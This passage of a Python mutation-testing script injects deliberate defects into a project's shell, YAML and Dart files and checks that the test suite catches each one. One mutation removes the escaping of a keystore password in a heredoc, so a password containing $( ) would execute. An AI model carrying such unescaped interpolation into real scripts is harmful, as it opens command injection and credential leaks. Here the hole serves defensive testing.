    Mutation("#119", "the credentials file is written by a heredoc",
             "tools/make_upload_key.sh",
             sub(r"escape_for_double_quotes \"\$HS_KEYSTORE_PASS\"", '$HS_KEYSTORE_PASS'),
             "a password containing $( ) executes and is recorded wrong",
             # The leak scan added for #190 now fires first, inside the same
             # round-trip test: an unescaped password partially reaches
             # stderr. Earlier and more specific than the old marker.
             'survives the round trip'),
]


def run(cmd: list[str], **kw) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True, **kw)


def parses_as_yaml(path: pathlib.Path) -> bool:
    """A YAML mutation that breaks the syntax proves nothing (#172)."""
    if path.suffix not in {".yml", ".yaml"}:
        return True
    probe = run([
        "python3", "-c",
        "import sys\n"
        "try:\n"
        "    import yaml\n"
        "except ImportError:\n"
        "    sys.exit(3)\n"
        "yaml.safe_load(open(sys.argv[1]))\n",
        str(path),
    ])
    if probe.returncode == 3:
        return True  # no PyYAML here; the Dart guard will report a parse failure
    return probe.returncode == 0


def compiles_as_dart(paths: list[pathlib.Path]) -> bool:
    """The Dart half of the rule `parses_as_yaml` states for YAML (#203).

    A mutation that does not compile fails every test in the file at once,
    which is a red suite for a reason that has nothing to do with the guard
    being measured. YAML had this check from #172; Dart did not, and #203's
    mutation -- a call to a method that was never added -- spent two rounds
    reported as WRONG-REASON when the truth was that the battery could not
    apply it.
    """
    dart = [p for p in paths if p.suffix == ".dart"]
    if not dart:
        return True
    probe = run(["dart", "analyze", "--no-fatal-warnings", *[str(p) for p in dart]])
    return probe.returncode == 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--only", default="")
    args = ap.parse_args()

    selected = [m for m in MUTATIONS if args.only.lower() in
                f"{m.issue} {m.name} {m.path}".lower()]

    if args.list:
        for m in selected:
            print(f"{m.issue:<7} {m.path:<42} {m.name}")
        print(f"\n{len(selected)} mutations")
        return 0

    # A run that dies between "write the mutation" and "restore the file"
    # leaves a DEFECT in the working tree, and the next `git commit -a` sweeps
    # it into history. That happened: an owner-role grant on the CI service
    # account rode into a docs commit, and the working tree's later correction
    # hid it from the gate, because the gate reads the tree and not the commit.
    #
    # `finally` cannot cover a kill. A marker can: it outlives the process, so
    # an interrupted run is detectable by the next one instead of silent.
    if IN_FLIGHT.exists():
        print("mutation_check: a previous run did not restore these files:",
              file=sys.stderr)
        print(IN_FLIGHT.read_text().strip(), file=sys.stderr)
        print(f"Check them against HEAD (`git diff HEAD`) before committing "
              f"anything, then delete {IN_FLIGHT}", file=sys.stderr)
        return 2

    dirty = run(["git", "status", "--porcelain"]).stdout.strip()
    if dirty:
        print("mutation_check: refusing to run with uncommitted changes:", file=sys.stderr)
        print(dirty, file=sys.stderr)
        return 2

    print(f"mutation_check: {len(selected)} mutations\n")
    survived: list[Mutation] = []
    wrong: list[Mutation] = []
    broken: list[tuple[Mutation, str]] = []

    for i, m in enumerate(selected, 1):
        edits = [(m.path, m.apply), *m.also]
        targets = [ROOT / path for path, _ in edits]
        originals = [target.read_text() for target in targets]
        label = f"[{i}/{len(selected)}] {m.issue} {m.name}"
        try:
            mutated = [apply(text) for (_, apply), text in zip(edits, originals)]
        except LookupError as exc:
            broken.append((m, str(exc)))
            print(f"  BROKEN  {label}\n          {exc}")
            continue
        if mutated == originals:
            broken.append((m, "changed nothing"))
            print(f"  BROKEN  {label}\n          changed nothing")
            continue

        IN_FLIGHT.write_text(
            f"{m.issue} {m.name}\n"
            + "".join(f"  {path}\n" for path, _ in edits)
        )
        for target, text in zip(targets, mutated):
            target.write_text(text)
        try:
            unparseable = [t for t in targets if not parses_as_yaml(t)]
            if unparseable:
                broken.append((m, "left the file unparseable — it would fail for the wrong reason"))
                print(f"  BROKEN  {label}\n          unparseable after mutation")
                continue
            if not compiles_as_dart(targets):
                broken.append((m, "left the Dart unanalyzable — it would fail for the wrong reason"))
                print(f"  BROKEN  {label}\n          does not compile after mutation")
                continue
            result = run(SUITE)
            output = result.stdout + result.stderr
            if result.returncode == 0:
                # Re-run before reporting a survivor. A SURVIVED verdict is
                # the one that matters — it says a guard has a hole — and one
                # flaky green would announce a hole that is not there, or
                # worse, be dismissed as flake when it is real. A second
                # green costs one suite run on the rare path only (#192).
                confirm = run(SUITE)
                if confirm.returncode != 0:
                    output = confirm.stdout + confirm.stderr
                    print(f"  (first run of {label} was green, second was not "
                          f"— reporting the second)")
                else:
                    survived.append(m)
                    print(f"  SURVIVED {label}\n           {m.why}")
            if result.returncode == 0 and m not in survived:
                # Fell through from the flaky branch above; judged on the
                # confirming run's output.
                if m.expect and m.expect not in output:
                    wrong.append(m)
                    print(f"  WRONG-REASON {label}\n               the suite "
                          f"failed, but not with {m.expect!r}")
                else:
                    print(f"  caught  {label}")
            elif result.returncode == 0:
                pass
            elif m.expect and m.expect not in output:
                # Red, but not for this reason. Counting it as caught is how a
                # guard gets credit for an assertion it does not make.
                wrong.append(m)
                print(f"  WRONG-REASON {label}\n               the suite failed, "
                      f"but not with {m.expect!r}")
            else:
                print(f"  caught  {label}")
        finally:
            for target, text in zip(targets, originals):
                target.write_text(text)
            IN_FLIGHT.unlink(missing_ok=True)

    print()
    if broken:
        print(f"{len(broken)} mutation(s) could not be applied — the battery is "
              f"testing less than it claims:", file=sys.stderr)
        for m, why in broken:
            print(f"  {m.issue} {m.name}: {why}", file=sys.stderr)
    if wrong:
        print(f"{len(wrong)} mutation(s) failed the suite for the WRONG REASON — "
              f"the named assertion did not fire:", file=sys.stderr)
        for m in wrong:
            print(f"  {m.issue} {m.path}: {m.name} (expected {m.expect!r})",
                  file=sys.stderr)
    if survived:
        print(f"{len(survived)} mutation(s) SURVIVED — the guards do not catch them:",
              file=sys.stderr)
        for m in survived:
            print(f"  {m.issue} {m.path}: {m.name}", file=sys.stderr)
    if broken or survived or wrong:
        return 1 if (survived or wrong) else 2
    print(f"all {len(selected)} mutations caught")
    return 0


if __name__ == "__main__":
    sys.exit(main())
